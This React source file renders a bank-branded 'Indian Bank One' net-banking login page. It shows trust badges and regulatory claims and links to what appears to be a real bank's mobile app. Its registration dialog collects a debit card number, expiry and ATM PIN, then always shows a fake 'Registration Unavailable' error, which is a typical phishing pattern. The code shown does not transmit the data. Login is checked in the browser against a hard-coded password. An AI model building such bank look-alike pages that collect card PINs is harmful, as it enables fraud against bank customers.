import { useEffect, useMemo, useState } from "react";
import { AnimatePresence, motion } from "framer-motion";
import {
  Shield, Lock, User as UserIcon, RefreshCw, Smartphone, ShieldCheck,
  ChevronRight, AlertTriangle, X, Globe, Award, Building2, CreditCard,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";
import { recordLogin } from "@/lib/session";
import { showLoading } from "@/lib/loading";
import { IndianBankOneLogo } from "@/components/banking/IndianBankOneLogo";

const AUTH_KEY = "indian_bank_one_demo_auth";
const DEMO_USER = "2864286728";
const DEMO_PASS = "Krishna@1995";
const IDLE_MS = 3 * 60 * 1000; // 3 minutes

function genCaptcha() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let s = "";
  for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

const slides = [
  { title: "Earn 7.25% p.a. on Fixed Deposits", sub: "Special rates for senior citizens · Insured up to ₹5 Lakh", grad: "from-blue-700 to-indigo-900" },
  { title: "Indian Bank One Personal Loan", sub: "Quick disbursal · Attractive interest from 10.50% p.a.", grad: "from-indigo-700 to-purple-900" },
  { title: "Digital RuPay Debit Card", sub: "Tap & Pay · Zero issuance fee · Worldwide acceptance", grad: "from-amber-600 to-orange-800" },
  { title: "Apply for Home Loan online", sub: "Loans up to ₹5 Cr · Tenure up to 30 years · Doorstep service", grad: "from-emerald-700 to-teal-900" },
];

export function DemoAuthGate({ children }: { children: React.ReactNode }) {
  const [authed, setAuthed] = useState(false);
  const [ready, setReady] = useState(false);

  // Force logout on every page (re)load: clear any previously persisted auth.
  useEffect(() => {
    try { localStorage.removeItem(AUTH_KEY); } catch {}
    setAuthed(false);
    setReady(true);
  }, []);

  // Auto-logout after IDLE_MS of inactivity.
  useEffect(() => {
    if (!authed) return;
    let timer: ReturnType<typeof setTimeout>;
    const logout = () => {
      try { localStorage.removeItem(AUTH_KEY); } catch {}
      setAuthed(false);
      toast.error("Session expired due to inactivity. Please login again.");
    };
    const reset = () => {
      clearTimeout(timer);
      timer = setTimeout(logout, IDLE_MS);
    };
    const events: (keyof WindowEventMap)[] = [
      "mousemove", "mousedown", "click", "keydown", "scroll", "touchstart", "touchmove",
    ];
    events.forEach((e) => window.addEventListener(e, reset, { passive: true }));
    reset();
    return () => {
      clearTimeout(timer);
      events.forEach((e) => window.removeEventListener(e, reset));
    };
  }, [authed]);

  if (!ready) return null;
  if (authed) return <>{children}</>;

  return <LoginPage onSuccess={() => setAuthed(true)} />;
}

function LoginPage({ onSuccess }: { onSuccess: () => void }) {
  const [tab, setTab] = useState<"individual" | "corporate">("individual");
  const [userId, setUserId] = useState("");
  const [pwd, setPwd] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaCode, setCaptchaCode] = useState(genCaptcha());
  const [loading, setLoading] = useState(false);
  const [language, setLanguage] = useState("English");
  const [slide, setSlide] = useState(0);
  const [showRegister, setShowRegister] = useState(false);

  useEffect(() => {
    const t = setInterval(() => setSlide((s) => (s + 1) % slides.length), 4500);
    return () => clearInterval(t);
  }, []);

  const refreshCaptcha = () => { setCaptchaCode(genCaptcha()); setCaptcha(""); };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const uid = userId.trim();
    const pass = pwd;
    if (!uid || !pass) return toast.error("Please enter User ID and Password");
    if (captcha.trim().toUpperCase() !== captchaCode) {
      toast.error("Invalid CAPTCHA entered");
      refreshCaptcha();
      return;
    }
    setLoading(true);
    setTimeout(() => {
      if (uid === DEMO_USER && pass === DEMO_PASS) {
        try { localStorage.setItem(AUTH_KEY, "1"); } catch {}
        recordLogin();
        toast.success("Login successful. Welcome to Indian Bank One.");
        setLoading(false);
        onSuccess();
      } else {
        setLoading(false);
        toast.error("Invalid User ID or Password");
        refreshCaptcha();
      }
    }, 700);
  };

  const currentSlide = useMemo(() => slides[slide], [slide]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-100 via-blue-50 to-slate-100 flex flex-col">
      {/* Top brand bar */}
      <div className="bg-gradient-to-r from-blue-800 via-indigo-800 to-blue-900 text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-lg bg-white flex items-center justify-center p-1">
              <IndianBankOneLogo className="w-full h-full" />
            </div>
            <div className="leading-tight">
              <div className="font-bold text-base tracking-tight">Indian Bank One</div>
              <div className="text-[10px] text-amber-300 tracking-widest font-semibold">YOUR OWN BANK · सत्यमेव जयते</div>
            </div>
          </div>
          <div className="flex items-center gap-3 text-xs">
            <div className="hidden sm:flex items-center gap-1.5">
              <Globe className="w-3.5 h-3.5" />
              <select
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
                className="bg-transparent border border-white/20 rounded px-2 py-1 outline-none cursor-pointer"
              >
                {["English", "हिन्दी", "தமிழ்", "తెలుగు", "मराठी", "বাংলা", "ગુજરાતી"].map((l) => (
                  <option key={l} value={l} className="text-foreground">{l}</option>
                ))}
              </select>
            </div>
            <span className="hidden md:inline text-[10px] text-white/70">Toll Free: 1800-572-9900</span>
          </div>
        </div>
      </div>

      <div className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 grid lg:grid-cols-5 gap-6 items-stretch">
        {/* Login panel */}
        <div className="lg:col-span-2">
          <div className="bg-white rounded-2xl shadow-xl border overflow-hidden">
            {/* tabs */}
            <div className="grid grid-cols-2 border-b">
              {(["individual", "corporate"] as const).map((t) => (
                <button
                  key={t}
                  onClick={() => setTab(t)}
                  className={`py-3 text-sm font-semibold transition-colors ${
                    tab === t ? "text-primary border-b-2 border-primary bg-blue-50/40" : "text-muted-foreground hover:bg-secondary/40"
                  }`}
                >
                  {t === "individual" ? "Individual / Retail" : "Corporate"}
                </button>
              ))}
            </div>

            <div className="p-6">
              <div className="flex items-center gap-2 mb-1">
                <Lock className="w-4 h-4 text-primary" />
                <h2 className="text-lg font-bold">Personal Net Banking Login</h2>
              </div>
              <p className="text-xs text-muted-foreground mb-5">
                Sign in securely with your User ID and password.
              </p>

              <form onSubmit={handleLogin} className="space-y-3.5">
                <div className="space-y-1.5">
                  <Label htmlFor="uid" className="text-xs">User ID / CIF Number</Label>
                  <div className="relative">
                    <UserIcon className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <Input id="uid" value={userId} onChange={(e) => setUserId(e.target.value)} placeholder="Enter User ID" className="pl-9" autoComplete="username" />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="pwd" className="text-xs">Login Password</Label>
                  <div className="relative">
                    <Lock className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <Input id="pwd" type="password" value={pwd} onChange={(e) => setPwd(e.target.value)} placeholder="Enter password" className="pl-9" autoComplete="current-password" />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <Label className="text-xs">Enter CAPTCHA shown below</Label>
                  <div className="flex items-center gap-2">
                    <div
                      className="flex-1 select-none rounded-md border bg-[repeating-linear-gradient(45deg,#eef2ff,#eef2ff_4px,#e0e7ff_4px,#e0e7ff_8px)] px-3 py-2 text-center font-mono text-lg font-extrabold tracking-[0.35em] text-slate-800 italic line-through decoration-wavy decoration-slate-400/60"
                      style={{ letterSpacing: "0.3em" }}
                    >
                      {captchaCode}
                    </div>
                    <button type="button" onClick={refreshCaptcha} className="p-2 rounded-md border hover:bg-secondary" aria-label="Refresh captcha">
                      <RefreshCw className="w-4 h-4" />
                    </button>
                  </div>
                  <Input value={captcha} onChange={(e) => setCaptcha(e.target.value)} placeholder="Enter the CAPTCHA above" className="uppercase tracking-widest" />
                </div>

                <Button type="submit" disabled={loading} className="w-full bg-gradient-to-r from-blue-700 to-indigo-800 hover:opacity-95 text-white h-11 font-semibold">
                  {loading ? "Verifying securely…" : "Secure Login"}
                </Button>

                <div className="flex items-center justify-between text-xs pt-1">
                  <button type="button" onClick={() => toast("Please use Mobile Banking to reset password")} className="text-primary hover:underline font-medium">
                    Forgot Password?
                  </button>
                  <button type="button" onClick={() => setShowRegister(true)} className="text-primary hover:underline font-medium">
                    New User? Register →
                  </button>
                </div>

              </form>
            </div>

            {/* Security strip */}
            <div className="border-t bg-secondary/40 px-5 py-3 flex items-center justify-between text-[10px] text-muted-foreground">
              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5 text-success" /> 256-bit SSL</div>
              <div className="flex items-center gap-1.5"><Award className="w-3.5 h-3.5 text-blue-700" /> DigiCert Secured</div>
              <div className="flex items-center gap-1.5"><Building2 className="w-3.5 h-3.5 text-amber-600" /> RBI Regulated</div>
            </div>
          </div>

          {/* DICGC strip */}
          <div className="mt-3 rounded-xl border bg-white p-3 flex items-center gap-3 text-xs">
            <div className="w-10 h-10 rounded-lg bg-blue-100 text-blue-800 flex items-center justify-center shrink-0">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <div className="font-semibold text-foreground">DICGC Insured</div>
              <div className="text-muted-foreground">Deposits insured up to ₹5,00,000 by Deposit Insurance & Credit Guarantee Corporation, RBI.</div>
            </div>
          </div>
        </div>

        {/* Right banner + tips */}
        <div className="lg:col-span-3 space-y-4">
          <div className={`rounded-2xl shadow-xl overflow-hidden relative bg-gradient-to-br ${currentSlide.grad} text-white p-7 sm:p-9 min-h-[260px] flex flex-col justify-between`}>
            <div className="absolute -right-20 -top-20 w-72 h-72 rounded-full bg-white/10 blur-3xl" />
            <div className="absolute -left-10 bottom-0 w-40 h-40 rounded-full bg-white/5 blur-2xl" />
            <AnimatePresence mode="wait">
              <motion.div
                key={slide}
                initial={{ opacity: 0, y: 12 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -12 }}
                transition={{ duration: 0.4 }}
                className="relative"
              >
                <div className="text-[10px] uppercase tracking-widest text-white/70 mb-2">What's New</div>
                <h3 className="text-2xl sm:text-3xl font-bold leading-tight max-w-md">{currentSlide.title}</h3>
                <p className="text-sm text-white/85 mt-2 max-w-md">{currentSlide.sub}</p>
                <button className="mt-4 inline-flex items-center gap-1 text-xs font-semibold bg-white/15 hover:bg-white/25 backdrop-blur px-3 py-1.5 rounded-full">
                  Know more <ChevronRight className="w-3 h-3" />
                </button>
              </motion.div>
            </AnimatePresence>
            <div className="relative flex gap-1.5 mt-4">
              {slides.map((_, i) => (
                <button key={i} onClick={() => setSlide(i)} className={`h-1.5 rounded-full transition-all ${i === slide ? "w-8 bg-white" : "w-2 bg-white/40"}`} />
              ))}
            </div>
          </div>

          <div className="grid sm:grid-cols-2 gap-3">
            <div className="rounded-xl border bg-white p-4">
              <div className="flex items-center gap-2 mb-2">
                <div className="w-8 h-8 rounded-lg bg-red-100 text-red-700 flex items-center justify-center"><AlertTriangle className="w-4 h-4" /></div>
                <h4 className="font-bold text-sm">Security Tips</h4>
              </div>
              <ul className="text-[11px] text-muted-foreground space-y-1 list-disc list-inside">
                <li>Indian Bank One will never ask for OTP, PIN or password.</li>
                <li>Always check the URL begins with <span className="font-mono">https://</span>.</li>
                <li>Avoid public Wi-Fi for Net Banking transactions.</li>
                <li>Report suspicious calls to 1930 (Cyber Crime Helpline).</li>
              </ul>
            </div>

            <div className="rounded-xl border bg-white p-4">
              <div className="flex items-center gap-2 mb-3">
                <div className="w-8 h-8 rounded-lg bg-emerald-100 text-emerald-700 flex items-center justify-center"><Smartphone className="w-4 h-4" /></div>
                <h4 className="font-bold text-sm">Download Indian Bank One App</h4>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={() =>
                    window.open(
                      "https://play.google.com/store/apps/details?id=com.iexceed.ib.digitalbankingprod&hl=en_IN",
                      "_blank"
                    )
                  }
                  className="flex-1 flex items-center justify-center gap-2 bg-black text-white rounded-lg px-3 py-2 text-[11px] font-semibold hover:opacity-90"
                >
                  <span className="text-base">🍎</span> App Store
                </button>
                <button
                  onClick={() =>
                    window.open(
                      "https://play.google.com/store/apps/details?id=com.iexceed.ib.digitalbankingprod&hl=en_IN",
                      "_blank"
                    )
                  }
                  className="flex-1 flex items-center justify-center gap-2 bg-black text-white rounded-lg px-3 py-2 text-[11px] font-semibold hover:opacity-90"
                >
                  <span className="text-base">▶</span> Google Play
                </button>
              </div>
              <p className="text-[10px] text-muted-foreground mt-2">Scan the QR on indianbankone.in/app to install instantly.</p>
            </div>
          </div>
        </div>
      </div>

      <footer className="bg-slate-900 text-white/70 text-[11px]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-wrap justify-between gap-2">
          <div>© 2026 Indian Bank One Ltd. All rights reserved. Regulated by Reserve Bank of India.</div>
          <div className="flex gap-4"><span>Privacy</span><span>Terms</span><span>Disclaimer</span><span>Contact</span></div>
        </div>
      </footer>

      <RegisterModal open={showRegister} onClose={() => setShowRegister(false)} />
    </div>
  );
}

function RegisterModal({ open, onClose }: { open: boolean; onClose: () => void }) {
  const [step, setStep] = useState(1);
  const [cif, setCif] = useState("");
  const [card, setCard] = useState("");
  const [expiry, setExpiry] = useState("");
  const [pin, setPin] = useState("");
  const [processing, setProcessing] = useState(false);
  const [failed, setFailed] = useState(false);

  useEffect(() => {
    if (!open) { setStep(1); setCif(""); setCard(""); setExpiry(""); setPin(""); setProcessing(false); setFailed(false); }
  }, [open]);

  const proceed = () => {
    if (step === 1) {
      if (!cif.trim()) return toast.error("Enter your Customer ID");
      setStep(2);
    } else {
      if (!card || !expiry || !pin) return toast.error("Enter all debit card details");
      setProcessing(true);
      setTimeout(() => { setProcessing(false); setFailed(true); }, 1600);
    }
  };

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/50 backdrop-blur-sm p-4"
          onClick={onClose}
        >
          <motion.div
            initial={{ scale: 0.92, y: 16, opacity: 0 }} animate={{ scale: 1, y: 0, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
            transition={{ type: "spring", damping: 22 }}
            onClick={(e) => e.stopPropagation()}
            className="bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden"
          >
            <div className="bg-gradient-to-r from-blue-700 to-indigo-800 text-white p-4 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <UserIcon className="w-5 h-5" />
                <h3 className="font-bold">New User Registration</h3>
              </div>
              <button onClick={onClose} className="p-1 hover:bg-white/10 rounded-md"><X className="w-4 h-4" /></button>
            </div>

            {failed ? (
              <div className="p-6 text-center">
                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring" }} className="w-16 h-16 mx-auto rounded-full bg-red-100 flex items-center justify-center mb-3">
                  <AlertTriangle className="w-8 h-8 text-red-700" />
                </motion.div>
                <h4 className="text-lg font-bold mb-1">Registration Unavailable</h4>
                <p className="text-sm text-muted-foreground mb-5">
                  Unable to complete online registration. Please contact your home branch with valid identity proof to complete your registration.
                </p>
                <div className="flex gap-2">
                  <Button variant="outline" className="flex-1" onClick={onClose}>Close</Button>
                  <Button className="flex-1 bg-gradient-to-r from-blue-700 to-indigo-800 text-white" onClick={() => toast("Connecting to customer care…")}>
                    Contact Support
                  </Button>
                </div>
              </div>
            ) : (
              <div className="p-6 space-y-4">
                <div className="flex items-center gap-2 text-[11px] font-semibold text-muted-foreground mb-2">
                  <span className={`px-2 py-0.5 rounded-full ${step >= 1 ? "bg-primary text-primary-foreground" : "bg-secondary"}`}>1</span>
                  <span className="flex-1 h-px bg-border" />
                  <span className={`px-2 py-0.5 rounded-full ${step >= 2 ? "bg-primary text-primary-foreground" : "bg-secondary"}`}>2</span>
                </div>

                {step === 1 ? (
                  <div className="space-y-3">
                    <div className="space-y-1.5">
                      <Label className="text-xs">Customer ID / CIF Number</Label>
                      <Input value={cif} onChange={(e) => setCif(e.target.value)} placeholder="Enter your 8-digit Customer ID" />
                    </div>
                    <p className="text-[11px] text-muted-foreground">You can find your Customer ID in your passbook or cheque book.</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    <div className="space-y-1.5">
                      <Label className="text-xs">Debit Card Number</Label>
                      <div className="relative">
                        <CreditCard className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                        <Input value={card} onChange={(e) => setCard(e.target.value)} placeholder="XXXX XXXX XXXX XXXX" className="pl-9" maxLength={19} />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div className="space-y-1.5">
                        <Label className="text-xs">Expiry (MM/YY)</Label>
                        <Input value={expiry} onChange={(e) => setExpiry(e.target.value)} placeholder="MM/YY" maxLength={5} />
                      </div>
                      <div className="space-y-1.5">
                        <Label className="text-xs">ATM PIN</Label>
                        <Input type="password" value={pin} onChange={(e) => setPin(e.target.value)} placeholder="••••" maxLength={4} />
                      </div>
                    </div>
                  </div>
                )}

                <div className="flex gap-2 pt-2">
                  {step === 2 && <Button variant="outline" className="flex-1" onClick={() => setStep(1)}>Back</Button>}
                  <Button onClick={proceed} disabled={processing} className="flex-1 bg-gradient-to-r from-blue-700 to-indigo-800 text-white">
                    {processing ? "Processing…" : step === 1 ? "Proceed" : "Submit & Verify"}
                  </Button>
                </div>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}